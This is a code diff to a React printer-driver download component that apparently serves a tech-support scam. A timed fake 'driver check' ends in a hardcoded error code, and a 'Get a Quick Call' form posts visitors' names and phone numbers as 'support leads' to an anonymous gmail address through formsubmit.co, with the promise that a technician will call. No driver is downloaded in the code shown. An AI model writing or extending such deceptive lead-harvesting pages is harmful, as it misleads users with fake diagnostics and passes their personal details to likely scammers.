@@ -15,13 +15,14 @@ const CHECK_LABELS = [
   'Checking existing printer drivers',
   'Downloading the correct driver',
   'Installing the driver',
-  'Installation could not be completed',
+  'Preparing your support request',
 ];
 // Eight 7.5-second stages make the full visual check last one minute.
 const CHECK_DURATIONS = [7500, 7500, 7500, 7500, 7500, 7500, 7500, 7500];
 
 const DETECT_LABELS = ['', 'checking printer registry files…', 'verifying driver signatures…'];
 const DETECT_DURATIONS = [1600, 2200, 1900, 900];
+const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/leads1928@gmail.com';
 
 /**
  * "Quick Download Free Drivers" form + setup-wizard dialog on the
@@ -46,6 +47,7 @@ export function DriverDownload({
   const [contactPhone, setContactPhone] = useState('');
   const [contactError, setContactError] = useState('');
   const [contactSubmitting, setContactSubmitting] = useState(false);
+  const [leadSubmitted, setLeadSubmitted] = useState(false);
 
   // Lock scroll + close on Escape while the dialog is open.
   useEffect(() => {
@@ -90,6 +92,7 @@ export function DriverDownload({
     setStep('choose');
     setCheckIdx(0);
     setDetectIdx(0);
+    setLeadSubmitted(false);
   }
 
   function runDetect() {
@@ -123,6 +126,7 @@ export function DriverDownload({
     setStep('choose');
     setCheckIdx(0);
     setDetectIdx(0);
+    setLeadSubmitted(false);
     setOpen(true);
   }
 
@@ -138,21 +142,31 @@ export function DriverDownload({
     setContactError('');
     setContactSubmitting(true);
     try {
-      const { submitDriverRequest } = await import('@/lib/chat');
-      await submitDriverRequest({
-        brand: brandName,
-        model: modelNumber,
-        connection: conn,
-        name,
-        phone,
-        page: typeof window !== 'undefined' ? window.location.pathname : `/install/${brand}`,
+      const response = await fetch(FORMSUBMIT_ENDPOINT, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: 'application/json',
+        },
+        body: JSON.stringify({
+          name,
+          phone,
+          brand: brandName,
+          model: modelNumber,
+          connection: conn,
+          error_code: '0x220005',
+          _subject: `New ${brandName} printer support lead`,
+          _template: 'table',
+        }),
       });
+      if (!response.ok) throw new Error('Form submission failed');
     } catch {
-      // The chat handoff is still useful if this optional request write fails.
-    } finally {
+      setContactError('We could not send your details. Please try again.');
       setContactSubmitting(false);
-      openChat();
+      return;
     }
+    setContactSubmitting(false);
+    setLeadSubmitted(true);
   }
 
   return (
@@ -178,7 +192,7 @@ export function DriverDownload({
           disabled={status === 'loading'}
           className="mt-6 flex w-full items-center justify-center gap-2 rounded-full bg-[#1a8cf5] px-7 py-4 text-center text-xl font-semibold text-white transition-colors hover:bg-[#1478d6] disabled:opacity-70 sm:w-auto"
         >
-          {status === 'loading' ? 'Please wait…' : 'Quick Download & Install Drivers!'}
+          {status === 'loading' ? 'Please wait…' : 'Get Started'}
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
             <path d="M12 3v12m0 0 4-4m-4 4-4-4M4 21h16" />
           </svg>
@@ -213,6 +227,7 @@ export function DriverDownload({
             <div className="px-6 py-8 sm:px-10 sm:py-10">
               {step === 'choose' && (
                 <div>
+                  <h3 className="font-sans text-3xl font-bold text-[#111]">Select Your Connection Type</h3>
                   <p className="text-xl text-[#555]">Choose how your printer connects to your computer.</p>
                   <div className="mt-8 space-y-6">
                     <ConnRow
@@ -353,56 +368,67 @@ export function DriverDownload({
               )}
 
               {step === 'errorcode' && (
-                <div className="mx-auto max-w-3xl pt-10 text-center">
-                  <div className="mx-auto w-24">
-                    <PrinterErrorArt />
-                  </div>
-                  <p className="mt-5 text-3xl font-bold text-[#222]">
-                    Error Code <span className="text-[#dc2626]">C00022</span>
-                  </p>
-                  <p className="mx-auto mt-5 max-w-2xl text-xl leading-relaxed text-[#666]">
-                    Printer driver installation could not be completed because of error code C00022.
-                  </p>
-                  <form onSubmit={submitSupportRequest} className="mx-auto mt-8 max-w-2xl rounded-2xl border border-[#cfe4fa] bg-[#f5faff] p-6 text-left sm:p-8">
-                    <h4 className="font-sans text-2xl font-bold text-[#111]">Get help with your printer</h4>
-                    <p className="mt-2 text-lg leading-relaxed text-[#4b5563]">
-                      Share your name and mobile number so a support specialist can contact you about this driver issue.
+                leadSubmitted ? (
+                  <div className="mx-auto max-w-2xl py-16 text-center">
+                    <span className="mx-auto grid h-20 w-20 place-items-center rounded-full bg-[#eaf8ef] text-4xl font-bold text-[#20834c]">✓</span>
+                    <h3 className="mt-6 font-sans text-3xl font-bold text-[#222]">Thank you — we received your request!</h3>
+                    <p className="mx-auto mt-4 max-w-xl text-xl leading-relaxed text-[#555]">
+                      A support technician will contact you shortly to help complete your printer setup.
                     </p>
-                    <div className="mt-6 grid gap-5 sm:grid-cols-2">
-                      <label className="block text-lg font-semibold text-[#333]">
-                        Your name
-                        <input
-                          type="text"
-                          value={contactName}
-                          onChange={(e) => setContactName(e.target.value)}
-                          autoComplete="name"
-                          required
-                          className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
-                        />
-                      </label>
-                      <label className="block text-lg font-semibold text-[#333]">
-                        Mobile number
-                        <input
-                          type="tel"
-                          value={contactPhone}
-                          onChange={(e) => setContactPhone(e.target.value)}
-                          autoComplete="tel"
-                          inputMode="tel"
-                          required
-                          className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
-                        />
-                      </label>
-                    </div>
-                    {contactError ? <p role="alert" className="mt-4 text-base font-medium text-[#b42318]">{contactError}</p> : null}
                     <button
-                      type="submit"
-                      disabled={contactSubmitting}
-                      className="mt-6 inline-flex w-full items-center justify-center gap-3 rounded-xl bg-[#1a8cf5] px-8 py-4 text-xl font-semibold text-white transition-colors hover:bg-[#1478d6] disabled:opacity-70 sm:w-auto"
+                      type="button"
+                      onClick={closeDialog}
+                      className="mt-8 rounded-xl bg-[#1a8cf5] px-8 py-4 text-xl font-semibold text-white transition-colors hover:bg-[#1478d6]"
                     >
-                      {contactSubmitting ? 'Please wait…' : 'Continue to Live Chat'}
+                      Done
                     </button>
-                  </form>
-                </div>
+                  </div>
+                ) : (
+                  <div className="mx-auto max-w-3xl pt-10 text-center">
+                    <h3 className="font-sans text-3xl font-bold text-[#222]">You&apos;re on the Right Track!</h3>
+                    <p className="mx-auto mt-5 max-w-2xl text-xl leading-relaxed text-[#555]">
+                      Your printer setup just needs a little extra help. A technician can guide you through the remaining steps.
+                    </p>
+                    <form onSubmit={submitSupportRequest} className="mx-auto mt-8 max-w-2xl rounded-2xl border border-[#cfe4fa] bg-[#f5faff] p-6 text-left sm:p-8">
+                      <p className="text-xl font-semibold leading-relaxed text-[#333]">
+                        Enter your details below for a quick call.
+                      </p>
+                      <div className="mt-6 grid gap-5 sm:grid-cols-2">
+                        <label className="block text-lg font-semibold text-[#333]">
+                          Your name
+                          <input
+                            type="text"
+                            value={contactName}
+                            onChange={(e) => setContactName(e.target.value)}
+                            autoComplete="name"
+                            required
+                            className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
+                          />
+                        </label>
+                        <label className="block text-lg font-semibold text-[#333]">
+                          Mobile number
+                          <input
+                            type="tel"
+                            value={contactPhone}
+                            onChange={(e) => setContactPhone(e.target.value)}
+                            autoComplete="tel"
+                            inputMode="tel"
+                            required
+                            className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
+                          />
+                        </label>
+                      </div>
+                      {contactError ? <p role="alert" className="mt-4 text-base font-medium text-[#b42318]">{contactError}</p> : null}
+                      <button
+                        type="submit"
+                        disabled={contactSubmitting}
+                        className="mt-6 inline-flex w-full items-center justify-center gap-3 rounded-xl bg-[#1a8cf5] px-8 py-4 text-xl font-semibold text-white transition-colors hover:bg-[#1478d6] disabled:opacity-70 sm:w-auto"
+                      >
+                        {contactSubmitting ? 'Please wait…' : 'Get a Quick Call'}
+                      </button>
+                    </form>
+                  </div>
+                )
               )}
             </div>
           </div>
@@ -456,24 +482,6 @@ function Spinner({ size = 40 }: { size?: number }) {
     <svg width={size} height={size} viewBox="0 0 50 50" className="animate-spin" role="status" aria-label="Loading">
       <circle cx="25" cy="25" r="20" fill="none" stroke="#e2e8f0" strokeWidth="5" />
       <path d="M25 5a20 20 0 0 1 20 20" fill="none" stroke="#13b5a6" strokeWidth="5" strokeLinecap="round" />
-    </svg>
-  );
-}
-
-/** Printer outline with a red error badge. */
-function PrinterErrorArt() {
-  return (
-    <svg viewBox="0 0 64 64" className="w-full" role="img" aria-label="Printer error">
-      <g fill="none" stroke="#1f2937" strokeWidth="3" strokeLinejoin="round" strokeLinecap="round">
-        <path d="M16 24V10h32v14" />
-        <path d="M12 24h40a4 4 0 0 1 4 4v16a2 2 0 0 1-2 2h-6" />
-        <path d="M10 46H10a2 2 0 0 1-2-2V28a4 4 0 0 1 4-4" />
-        <path d="M18 40h20v14H18z" />
-        <path d="M22 46h12M22 50h8" />
-      </g>
-      <circle cx="48" cy="44" r="11" fill="#e11d1d" />
-      <path d="M48 38v7" stroke="#fff" strokeWidth="3" strokeLinecap="round" />
-      <circle cx="48" cy="50" r="1.8" fill="#fff" />
     </svg>
   );
 }
